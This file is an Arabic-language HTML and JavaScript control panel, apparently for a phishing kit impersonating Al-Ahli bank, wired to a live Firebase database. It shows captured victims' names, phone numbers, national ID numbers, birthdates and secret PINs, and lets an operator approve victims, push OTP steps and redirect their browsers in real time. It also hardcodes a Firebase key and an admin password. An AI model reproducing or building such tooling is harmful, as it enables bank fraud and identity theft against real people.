<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>لوحة التحكم - الأهلي</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: #f5f6fa; min-height: 100vh; padding: 20px; }
        .login-container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); }
        .dashboard { display: none; max-width: 1400px; margin: 0 auto; }
        h1 { color: #1e3c72; margin-bottom: 20px; text-align: center; }
        h2 { color: #333; margin-bottom: 15px; font-size: 20px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 600; }
        input { width: 100%; padding: 12px; border: 2px solid #e0e0e0; border-radius: 8px; font-size: 16px; }
        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #1e3c72, #2a5298); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 8px 25px rgba(42, 82, 152, 0.3); }
        .btn-success { background: linear-gradient(135deg, #27ae60, #2ecc71); }
        .btn-danger { background: linear-gradient(135deg, #e74c3c, #c0392b); }
        .btn-warning { background: linear-gradient(135deg, #f39c12, #e67e22); }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: white; padding: 25px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); text-align: center; }
        .stat-number { font-size: 36px; font-weight: bold; color: #1e3c72; margin-bottom: 5px; }
        .stat-label { color: #666; font-size: 14px; }
        .visitors-list { background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); overflow: hidden; }
        .visitor-item { padding: 20px; border-bottom: 1px solid #eee; display: flex; justify-content: space-between; align-items: center; cursor: pointer; transition: background 0.2s; }
        .visitor-item:hover { background: #f8f9fa; }
        .visitor-item.active { background: #e3f2fd; border-right: 4px solid #2a5298; }
        .visitor-info h4 { color: #333; margin-bottom: 5px; font-size: 16px; }
        .visitor-info p { color: #666; font-size: 13px; }
        .status-badge { padding: 6px 12px; border-radius: 20px; font-size: 12px; font-weight: 600; }
        .status-waiting { background: #fff3e0; color: #e65100; }
        .status-approved { background: #e8f5e9; color: #2e7d32; }
        .status-rejected { background: #ffebee; color: #c62828; }
        .status-otp { background: #e3f2fd; color: #1565c0; }
        .detail-panel { background: white; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.08); padding: 25px; }
        .detail-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #eee; }
        .detail-row:last-child { border-bottom: none; }
        .detail-label { color: #666; font-weight: 500; }
        .detail-value { color: #333; font-weight: 600; }
        .actions { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
        .btn-small { padding: 10px; font-size: 14px; }
        .activity-log { background: #f8f9fa; border-radius: 8px; padding: 15px; margin-top: 20px; max-height: 200px; overflow-y: auto; }
        .log-item { padding: 8px 0; border-bottom: 1px solid #e0e0e0; font-size: 13px; color: #555; }
        .log-item:last-child { border-bottom: none; }
        .log-time { color: #999; font-size: 11px; }
        .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        @media (max-width: 768px) { .grid-2 { grid-template-columns: 1fr; } }
    </style>
</head>
<body>
    <!-- Login Screen -->
    <div class="login-container" id="login-screen">
        <h1>🔐 لوحة التحكم</h1>
        <div class="form-group">
            <label>اسم المستخدم</label>
            <input type="text" id="admin-username" value="admin">
        </div>
        <div class="form-group">
            <label>كلمة المرور</label>
            <input type="password" id="admin-password" placeholder="••••••••">
        </div>
        <button class="btn" onclick="adminLogin()">دخول</button>
        <p id="login-error" class="error hidden" style="margin-top: 15px;">اسم المستخدم أو كلمة المرور غير صحيحة</p>
    </div>

    <!-- Dashboard -->
    <div class="dashboard" id="dashboard">
        <h1 style="text-align: right; margin-bottom: 30px;">📊 لوحة التحكم - مراقبة الزوار</h1>
        
        <div class="stats">
            <div class="stat-card">
                <div class="stat-number" id="stat-total">0</div>
                <div class="stat-label">إجمالي الزوار</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="stat-waiting">0</div>
                <div class="stat-label">بانتظار الموافقة</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="stat-otp">0</div>
                <div class="stat-label">في مرحلة OTP</div>
            </div>
            <div class="stat-card">
                <div class="stat-number" id="stat-completed">0</div>
                <div class="stat-label">تم التحقق</div>
            </div>
        </div>

        <div class="grid-2">
            <div class="visitors-list">
                <div style="padding: 20px; background: #1e3c72; color: white;">
                    <h2 style="color: white; margin: 0;">👥 الزوار النشطون</h2>
                </div>
                <div id="visitors-container" style="max-height: 500px; overflow-y: auto;">
                    <div style="padding: 40px; text-align: center; color: #999;">جاري تحميل البيانات...</div>
                </div>
            </div>

            <div class="detail-panel" id="detail-panel">
                <h2>📋 تفاصيل الزائر</h2>
                <p style="color: #999; text-align: center; padding: 40px 0;">اختر زائراً من القائمة لعرض التفاصيل</p>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // FIREBASE CONFIGURATION
        // ============================================
        const firebaseConfig = {
            apiKey: "AIzaSyBWJvL51kp6e24PkuEYTwyfNpKDYyRI05M",
            authDomain: "ahlfoncsh.firebaseapp.com",
            databaseURL: "https://ahlfoncsh-default-rtdb.firebaseio.com",
            projectId: "ahlfoncsh",
            storageBucket: "ahlfoncsh.firebasestorage.app",
            messagingSenderId: "5159433699",
            appId: "1:5159433699:web:49005391c7cadec5939cd6"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // ============================================
        // ADMIN AUTH
        // ============================================
        const ADMIN_USER = 'admin';
        const ADMIN_PASS = 'ahly2024';

        function adminLogin() {
            const user = document.getElementById('admin-username').value;
            const pass = document.getElementById('admin-password').value;
            
            if (user === ADMIN_USER && pass === ADMIN_PASS) {
                document.getElementById('login-screen').style.display = 'none';
                document.getElementById('dashboard').style.display = 'block';
                initDashboard();
            } else {
                document.getElementById('login-error').classList.remove('hidden');
            }
        }

        // ============================================
        // DASHBOARD
        // ============================================
        let visitors = {};
        let selectedVisitor = null;

        function initDashboard() {
            loadVisitors();
            setInterval(updateStats, 1000);
        }

        function loadVisitors() {
            database.ref('site1/sessions').on('value', (snapshot) => {
                visitors = snapshot.val() || {};
                renderVisitorsList();
                updateStats();
            });
        }

        function updateStats() {
            let total = 0, waiting = 0, otp = 0, completed = 0;
            const now = Date.now();
            
            for (let id in visitors) {
                const v = visitors[id];
                if (now - v.lastActive < 3600000) {
                    total++;
                    if (v.status === 'waiting_approval') waiting++;
                    else if (v.currentPage === 'otp') otp++;
                    else if (v.status === 'completed') completed++;
                }
            }
            
            document.getElementById('stat-total').textContent = total;
            document.getElementById('stat-waiting').textContent = waiting;
            document.getElementById('stat-otp').textContent = otp;
            document.getElementById('stat-completed').textContent = completed;
        }

        function renderVisitorsList() {
            const container = document.getElementById('visitors-container');
            let html = '';
            
            const sorted = Object.entries(visitors).sort((a, b) => (b[1].lastActive || 0) - (a[1].lastActive || 0));
            
            for (let [id, v] of sorted) {
                const isActive = Date.now() - v.lastActive < 3600000;
                if (!isActive) continue;
                
                let statusClass = 'status-waiting';
                let statusText = 'بانتظار';
                if (v.status === 'waiting_approval') { statusClass = 'status-waiting'; statusText = 'بانتظار الموافقة'; }
                else if (v.currentPage === 'otp') { statusClass = 'status-otp'; statusText = 'OTP'; }
                else if (v.status === 'completed') { statusClass = 'status-approved'; statusText = 'تم التحقق'; }
                
                html += `
                    <div class="visitor-item ${selectedVisitor === id ? 'active' : ''}" onclick="selectVisitor('${id}')">
                        <div class="visitor-info">
                            <h4>${v.fullname || 'زائر جديد'}</h4>
                            <p>${v.phone || ''} | ${new Date(v.lastActive).toLocaleTimeString('ar-SA')}</p>
                        </div>
                        <span class="status-badge ${statusClass}">${statusText}</span>
                    </div>
                `;
            }
            
            container.innerHTML = html || '<div style="padding: 40px; text-align: center; color: #999;">لا يوجد زوار نشطون</div>';
        }

        function selectVisitor(id) {
            selectedVisitor = id;
            const v = visitors[id];
            if (!v) return;
            
            renderVisitorsList();
            
            let statusHtml = '';
            if (v.status === 'waiting_approval') {
                statusHtml = `
                    <div style="margin: 20px 0;">
                        <button class="btn btn-success" onclick="approveVisitor('${id}')" style="margin-bottom: 10px;">✅ الموافقة وإرسال OTP</button>
                        <button class="btn btn-danger" onclick="rejectVisitor('${id}')">❌ رفض</button>
                    </div>
                `;
            } else if (v.currentPage === 'otp') {
                statusHtml = `
                    <div style="background: #e3f2fd; padding: 15px; border-radius: 10px; margin: 20px 0;">
                        <p style="margin-bottom: 10px;"><strong>رمز OTP:</strong> <span style="font-size: 24px; color: #1565c0;">${v.otp || '------'}</span></p>
                        <p style="font-size: 12px; color: #666;">بانتظار إدخال المستخدم للرمز</p>
                    </div>
                    <button class="btn btn-warning" onclick="requestOTP('${id}')">🔄 إعادة إرسال OTP</button>
                `;
            }
            
            document.getElementById('detail-panel').innerHTML = `
                <h2>📋 تفاصيل الزائر</h2>
                <div class="detail-row">
                    <span class="detail-label">الاسم:</span>
                    <span class="detail-value">${v.fullname || '-'}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">رقم الهاتف:</span>
                    <span class="detail-value">${v.phone || '-'}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">رقم الهوية:</span>
                    <span class="detail-value">${v.idnumber || '-'}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">تاريخ الميلاد:</span>
                    <span class="detail-value">${v.birthdate || '-'}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">الرقم السري:</span>
                    <span class="detail-value">${v.pin || '-'}</span>
                </div>
                <div class="detail-row">
                    <span class="detail-label">الصفحة الحالية:</span>
                    <span class="detail-value">${v.currentPage || '-'}</span>
                </div>
                ${statusHtml}
                <div style="margin-top: 20px;">
                    <h3 style="font-size: 16px; margin-bottom: 10px;">🎮 تحكم سريع:</h3>
                    <button class="btn btn-small" onclick="redirectVisitor('${id}', 'landing')" style="background: #666; margin-bottom: 5px;">الصفحة الرئيسية</button>
                    <button class="btn btn-small" onclick="redirectVisitor('${id}', 'personal')" style="background: #666; margin-bottom: 5px;">المعلومات الشخصية</button>
                    <button class="btn btn-small" onclick="redirectVisitor('${id}', 'login')" style="background: #666; margin-bottom: 5px;">تسجيل الدخول</button>
                    <button class="btn btn-small" onclick="redirectVisitor('${id}', 'otp')" style="background: #666; margin-bottom: 5px;">OTP</button>
                </div>
            `;
        }

        // ============================================
        // ADMIN ACTIONS
        // ============================================
        function approveVisitor(id) {
            database.ref('site1/sessions/' + id + '/adminCommand').set({
                action: 'approve',
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }

        function rejectVisitor(id) {
            database.ref('site1/sessions/' + id + '/adminCommand').set({
                action: 'reject',
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }

        function requestOTP(id) {
            const otp = Math.floor(100000 + Math.random() * 900000).toString();
            database.ref('site1/sessions/' + id).update({
                otp: otp,
                currentPage: 'otp',
                status: 'otp_sent'
            });
            database.ref('site1/sessions/' + id + '/adminCommand').set({
                action: 'redirect',
                page: 'otp',
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }

        function redirectVisitor(id, page) {
            database.ref('site1/sessions/' + id).update({
                currentPage: page
            });
            database.ref('site1/sessions/' + id + '/adminCommand').set({
                action: 'redirect',
                page: page,
                timestamp: firebase.database.ServerValue.TIMESTAMP
            });
        }

        // Enter key support
        document.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') adminLogin();
        });
    </script>
</body>
</html>
